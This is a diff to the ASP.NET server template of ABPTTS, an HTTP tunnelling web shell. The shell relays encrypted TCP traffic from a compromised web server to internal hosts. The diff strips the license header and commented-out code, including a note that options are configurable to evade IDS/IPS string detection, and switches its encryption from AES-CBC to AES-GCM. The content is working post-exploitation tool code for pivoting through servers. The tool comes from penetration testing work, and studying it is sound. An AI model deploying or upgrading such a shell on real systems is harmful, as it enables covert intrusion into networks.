@@ -9,53 +9,6 @@
 
 <script runat="server">
 
-/*
-
-	This file is part of A Black Path Toward The Sun ("ABPTTS")
-
-	Copyright 2016 NCC Group
-
-	A Black Path Toward The Sun ("ABPTTS") is free software: you can redistribute it and/or modify
-	it under the terms of version 2 of the GNU General Public License as published by
-	the Free Software Foundation.
-
-	A Black Path Toward The Sun ("ABPTTS") is distributed in the hope that it will be useful,
-	but WITHOUT ANY WARRANTY; without even the implied warranty of
-	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-	GNU General Public License for more details.
-
-	You should have received a copy of the GNU General Public License
-	along with A Black Path Toward The Sun ("ABPTTS") (in the file license.txt).
-	If not, see <http://www.gnu.org/licenses/>.
-
-	Version 1.0
-	Ben Lincoln, NCC Group
-	2016-07-30
-
-	A Black Path Toward The Sun server component template file (ASP.NET / C#)
-	
-	Tested successfully on:
-		
-		IIS
-			6.0 (.NET 2.0.50727 / Windows Server 2003 R2 SP2 / x86-64 / VirtualBox)
-
-			6.0 (.NET 2.0.50727 / Windows Server 2003 R2 SP2 / x86-64 / VMWare Fusion)
-			
-			7.5 (.NET 2.0.50727 / Windows 7 / x86-64 / Physical Workstation)
-			
-			7.5 (.NET 4.0.30319 / Windows 7 / x86-64 / Physical Workstation)
-
-		Apache httpd with Mono
-			httpd 2.2.22 (.NET 4.0.30319 / Ubuntu 12.04.2 /x86-64 / VirtualBox) [ ~3x faster tunneled SSH than IIS on Windows 7 x64! -Ben ]
-			
-			httpd 2.4.10 (.NET 4.0.30319 / Debian 8 / x86-64 / VMWare Fusion)
-			
-		ASP.NET Development Server
-			10.0.0.0 (.NET 4.0.30319 / Windows 7 / x86-64 / Physical Workstation)
-			
-*/
-
-
 public class SessionConnection
 {
     public string ConnectionID;
@@ -79,7 +32,6 @@ public class SessionConnection
     {
         if (newBytes.Length > 0)
         {
-            // might need to backport this to JSP
             lock (sessionConnectionLockObject)
             {
                 byte[] newReceiveBuffer = new byte[ReceiveBuffer.Length + newBytes.Length];
@@ -105,13 +57,11 @@ public class SessionConnection
         Sock.ReceiveBufferSize = serverSocketReceiveBufferSize;
         Sock.ReceiveTimeout = serverSocketIOTimeout;
         Sock.Connect(DestHost, DestPort);
-        //Sock.NoDelay = true;
     }
 
     public byte[] GetBytesFromReceiveBuffer(int maxBytes)
     {
         byte[] result = new byte[0];
-        // might need to backport this to JSP
         lock (sessionConnectionLockObject)
         {
             int byteCount = maxBytes;
@@ -164,9 +114,6 @@ protected const int serverSocketReceiveBufferSize = |PLACEHOLDER_serverSocketRec
 
 protected const int serverToClientBlockSize = |PLACEHOLDER_serverToClientBlockSize|;
 
-/* Most of the options in this section are configurable to avoid simplistic string-based IDS/IPS-type detection */
-/* If they are altered, be sure to pass the corresponding alternate values to the Python client software */
-
 protected const string headerValueKey = "|PLACEHOLDER_headerValueKey|";
 protected const string encryptionKeyHex = "|PLACEHOLDER_encryptionKeyHex|";
 
@@ -207,7 +154,6 @@ protected const string responseStringErrorEncryptFailed = "|PLACEHOLDER_response
 protected const string responseStringErrorEncryptionNotSupported = "|PLACEHOLDER_responseStringErrorEncryptionNotSupported|";
 protected const string responseStringPrefixB64 = "|PLACEHOLDER_responseStringPrefixB64|";
 protected const string responseStringSuffixB64 = "|PLACEHOLDER_responseStringSuffixB64|";
-
 
 /* End configurable options */
 
@@ -301,7 +247,7 @@ protected void Page_Load(object sender, EventArgs e)
 				    decodedBytes = Convert.FromBase64String(Request.Params[paramNameEncryptedBlock]);
 				    try
 				    {
-					    byte[] decryptedBytes = DecryptData(decodedBytes, encryptionKey, encryptionBlockSize);
+					    byte[] decryptedBytes = DecryptData(decodedBytes, encryptionKey);
                         unpackedBlock = System.Text.Encoding.UTF8.GetString(decryptedBytes);
                         encryptedRequest = true;
 				    }
@@ -535,28 +481,7 @@ protected void Page_Load(object sender, EventArgs e)
                     DestPort = Conn.PortNumber;
                     Conn.InitializeSocket(useIPV6ClientSocketOnServer, DestHost, DestPort, serverSocketIOTimeout, serverSocketSendBufferSize, serverSocketReceiveBufferSize);
                 }
-            }	
-
-            //NetworkStream netStream = null;
-            //try
-            //{
-            //    netStream = Conn.TCPClient.GetStream();
-            //}
-            //catch (Exception ex)
-            //{
-            //    // need to backport this to the JSP version
-            //    if (Conn != null)
-            //    {
-            //        if (!Conn.Sock.Connected)
-            //        {
-            //            DestHost = Conn.Host;
-            //            DestPort = Conn.PortNumber;
-            //            Conn.InitializeSocket(useIPV6ClientSocketOnServer, DestHost, DestPort, serverSocketIOTimeout, serverSocketSendBufferSize, serverSocketReceiveBufferSize);
-            //        }
-            //    }			        
-            //}
-            //BinaryReader netInReader = new BinaryReader(netStream);
-            //BinaryWriter netOutWriter = new BinaryWriter(netStream);
+            }
 
 		    byte[] bytesOut = Convert.FromBase64String(DataB64);
 		
@@ -564,11 +489,7 @@ protected void Page_Load(object sender, EventArgs e)
 		
 		    try
 		    {
-			    //netOutWriter.Write(bytesOut);
-                //netStream.Write(bytesOut, 0, bytesOut.Length);
                 Conn.Sock.Send(bytesOut);
-                //netOutWriter.Close();
-			    //netOutWriter.Flush();
 		    }
 		    catch (Exception ex)
 		    {
@@ -576,29 +497,18 @@ protected void Page_Load(object sender, EventArgs e)
 			    opMode = OPMODE_CLOSE;
 		    }
 
-            //if (!Conn.TCPClient.Connected)
-            //{
-            //    socketStillOpen = false;
-            //}
-		
 		    byte[] bytesIn = new byte[0];
 
             if (socketStillOpen)
             {
                 byte[] buf = new byte[6553600];
                 int maxReadAttempts = 65536000;
-                //maxReadAttempts = 1000;
-                //maxReadAttempts = 500;
                 maxReadAttempts = 200;
                 int readAttempts = 0;
                 int nRead = 0;
                 bool doneReading = false;
                 try
                 {
-                    //nRead = netInReader.Read(buf, 0, buf.Length);
-                    //nRead = netInReader.Read(buf, 0, Conn.TCPClient.Available);
-                    //nRead = netStream.Read(buf, 0, Conn.TCPClient.Available);
-                    // this works: if (Conn.Sock.Poll(serverSocketIOTimeout * 1000, SelectMode.SelectRead))
                     if (Conn.Sock.Poll(serverSocketIOTimeout * 100, SelectMode.SelectRead))
                     {
                         nRead = Conn.Sock.Receive(buf);
@@ -615,10 +525,6 @@ protected void Page_Load(object sender, EventArgs e)
                 catch (Exception ex)
                 {
                     doneReading = true;
-                    // may need to backport this to the JSP version
-                    //nRead = -1;
-                    //socketStillOpen = false;
-                    //opMode = OPMODE_CLOSE;
                 }
                 while (!doneReading)
                 {
@@ -632,17 +538,9 @@ protected void Page_Load(object sender, EventArgs e)
                         Array.Copy(buf, 0, newBytesIn, bytesIn.Length, nRead);
                         bytesIn = newBytesIn;
                     }
-                    //if (nRead > 0)
-                    //{
-                    //    Array.Copy(buf, 0, newBytesIn, bytesIn.Length, nRead);
-                    //    bytesIn = newBytesIn;
-                    //}
 
                     try
                     {
-                        //nRead = netInReader.Read(buf, 0, buf.Length);
-                        //nRead = netInReader.Read(buf, 0, Conn.TCPClient.Available);
-                        //nRead = netStream.Read(buf, 0, Conn.TCPClient.ReceiveBufferSize);
                         if (Conn.Sock.Poll(serverSocketIOTimeout, SelectMode.SelectRead))
                         {
                             nRead = Conn.Sock.Receive(buf);
@@ -666,21 +564,12 @@ protected void Page_Load(object sender, EventArgs e)
                     catch (Exception ex)
                     {
                         doneReading = true;
-                        //nRead = -1;
-                        //socketStillOpen = false;
-                        //opMode = OPMODE_CLOSE;
                     }
                     readAttempts++;
                     if (readAttempts > maxReadAttempts)
                     {
                         doneReading = true;
                     }
-                    //if (!Conn.Sock.Connected)
-                    //{
-                    //    doneReading = true;
-                    //    socketStillOpen = false;
-                    //    //opMode = OPMODE_CLOSE;
-                    //}
                 }
 
                 // might need to backport this to JSP
@@ -689,8 +578,6 @@ protected void Page_Load(object sender, EventArgs e)
                     Conn.AddBytesToReceiveBuffer(bytesIn);
                 }
             }
-
-            //netStream.Close();
 		
 		    if (Conn.ReceiveBuffer.Length > 0)
 		    {
@@ -705,13 +592,12 @@ protected void Page_Load(object sender, EventArgs e)
 			    {
 				    try
 				    {
-					    byte[] encryptedBytes = EncryptData(toClient, encryptionKey, encryptionBlockSize);
+					    byte[] encryptedBytes = EncryptData(toClient, encryptionKey);
 					    OutB64 = Convert.ToBase64String(encryptedBytes);
 				    }
 				    catch (Exception ex)
 				    {
 					    Response.Write(responseStringErrorEncryptFailed);
-					    /* return; */
 					    validRequest = false;
 					    sentResponse = true;
 				    }
@@ -842,69 +728,49 @@ public byte[] hexStringToByteArray(string hex)
     return bytes;
 }
 
-public byte[] GenerateRandomBytes(int byteCount)
+public byte[] EncryptData(byte[] plaintext, byte[] key)
 {
-    byte[] result = new byte[byteCount];
-    new Random().NextBytes(result);
-    return result;
+	int ivSize = 12;
+	int tagSize = 16;
+    byte[] data = new byte[ivSize + plaintext.Length + tagSize];
+
+	using (AesGcm cipher = new AesGcm(key, tagSize))
+	{
+		byte[] nonce = new byte[ivSize];
+      	RandomNumberGenerator.Fill(nonce);
+		System.Buffer.BlockCopy(nonce, 0, data, 0, ivSize);
+
+		byte[] tag = new byte[tagSize];
+		byte[] ciphertext = new byte[plaintext.Length];
+		cipher.Encrypt(nonce, plaintext, ciphertext, tag, null);
+		System.Buffer.BlockCopy(ciphertext, 0, data, ivSize, ciphertext.Length);
+		System.Buffer.BlockCopy(tag, 0, data, ciphertext.Length + ivSize, tagSize);
+	}
+
+	return data;
 }
 
-// http://stackoverflow.com/questions/273452/using-aes-encryption-in-c-sharp
-public byte[] EncryptData(byte[] plainText, byte[] key, int blockSize)
+public byte[] DecryptData(byte[] ciphertext, byte[] key)
 {
-	byte[] iv = GenerateRandomBytes(blockSize);
-	// typical AES encryption depends on the IV alone preventing identical inputs from 
-	// encrypting to identical outputs
-	// MIT Kerberos uses a model in which the IV is set to all zeroes, but the first 
-	// block of data is random, and then discarded on decryption
-	// I think of this as a "reinitialization vector" that takes place on the other 
-	// side of the encryption "looking glass". It should also help protect against 
-	// theoretical known-plaintext vulnerabilities in AES.
-	// why not use both? 
-	byte[] reIV = GenerateRandomBytes(blockSize);
-    RijndaelManaged rijn = new RijndaelManaged();
-    rijn.BlockSize = encryptionBlockSize * 8;
-    rijn.Key = key;
-    rijn.IV = iv;
-    rijn.Mode = CipherMode.CBC;
-    rijn.Padding = PaddingMode.PKCS7;
+	int ivSize = 12;
+	int tagSize = 16;
+    byte[] plaintext = new byte[ciphertext.Length - ivSize - tagSize];
 
-    //ICryptoTransform encryptor = rijn.CreateEncryptor(rijn.Key, rijn.IV);
-    ICryptoTransform encryptor = rijn.CreateEncryptor();
+    using (AesGcm cipher = new AesGcm(key, tagSize))
+    {
+        byte[] nonce = new byte[ivSize];
+        System.Buffer.BlockCopy(ciphertext, 0, nonce, 0, ivSize);
 
-	byte[] rivPlainText = new byte[plainText.Length + blockSize];
-    Array.Copy(reIV, 0, rivPlainText, 0, blockSize);
-	Array.Copy(plainText, 0, rivPlainText, blockSize, plainText.Length);
-    byte[] cipherText = encryptor.TransformFinalBlock(rivPlainText, 0, rivPlainText.Length);
+        byte[] data = new byte[ciphertext.Length - ivSize - tagSize];
+        System.Buffer.BlockCopy(ciphertext, ivSize, data, 0, ciphertext.Length - ivSize - tagSize);
 
-	byte[] ivCipherText = new byte[cipherText.Length + blockSize];
-    Array.Copy(iv, 0, ivCipherText, 0, blockSize);
-    Array.Copy(cipherText, 0, ivCipherText, blockSize, cipherText.Length);
-	return ivCipherText;
-}
+        byte[] tag = new byte[tagSize];
+        System.Buffer.BlockCopy(ciphertext, ciphertext.Length - tagSize, tag, 0, tagSize);
 
-public byte[] DecryptData(byte[] cipherText, byte[] key, int blockSize)
-{
-    byte[] iv = new byte[blockSize];
-    byte[] strippedCipherText = new byte[cipherText.Length - blockSize];
+        cipher.Decrypt(nonce, data, tag, plaintext);
+    }
 
-    RijndaelManaged rijn = new RijndaelManaged();
-    rijn.BlockSize = encryptionBlockSize * 8;
-    rijn.Key = key;
-    rijn.IV = iv;
-    rijn.Mode = CipherMode.CBC;
-    rijn.Padding = PaddingMode.PKCS7;
-
-    Array.Copy(cipherText, 0, iv, 0, blockSize);
-    Array.Copy(cipherText, blockSize, strippedCipherText, 0, strippedCipherText.Length);
-
-    //ICryptoTransform decryptor = rijn.CreateDecryptor(rijn.Key, rijn.IV);
-    ICryptoTransform decryptor = rijn.CreateDecryptor();
-    byte[] rivPlainText = decryptor.TransformFinalBlock(strippedCipherText, 0, strippedCipherText.Length);
-
-    byte[] plainText = new byte[rivPlainText.Length - blockSize];
-    Array.Copy(rivPlainText, blockSize, plainText, 0, plainText.Length);
-    return plainText;
+    return plaintext;
 }
 
 // http://stackoverflow.com/questions/8613187/an-elegant-way-to-consume-all-bytes-of-a-binaryreader
